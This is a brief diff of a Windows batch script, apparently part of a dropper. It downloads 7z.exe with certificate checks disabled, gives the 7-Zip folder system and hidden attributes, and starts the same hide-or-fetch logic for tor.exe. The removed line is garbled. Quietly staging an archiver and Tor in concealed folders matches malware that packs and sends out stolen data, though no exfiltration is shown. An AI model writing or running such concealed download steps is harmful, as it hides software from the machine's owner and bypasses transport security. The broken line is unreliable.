@@ -15,7 +15,7 @@ rem TESTING <
 attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
       attrib +s +h +i "%environment%\7-Zip"
 ) else (
-  mkdir "%environment%\7-Zip" && "%environment%\curl.exe" -k -L https://github.com/uuksu/7z.NET/blob/master/7z.NET/7za.exe -o "%environment%\7-Zip\7z.exe" && attrib +s +h +i "%environment%\7-Zip"nment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
+  mkdir "%environment%\7-Zip" && "%environment%\curl.exe" -k -L https://github.com/uuksu/7z.NET/blob/master/7z.NET/7za.exe -o "%environment%\7-Zip\7z.exe" && attrib +s +h +i "%environment%\7-Zip" 
 )
 
 attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
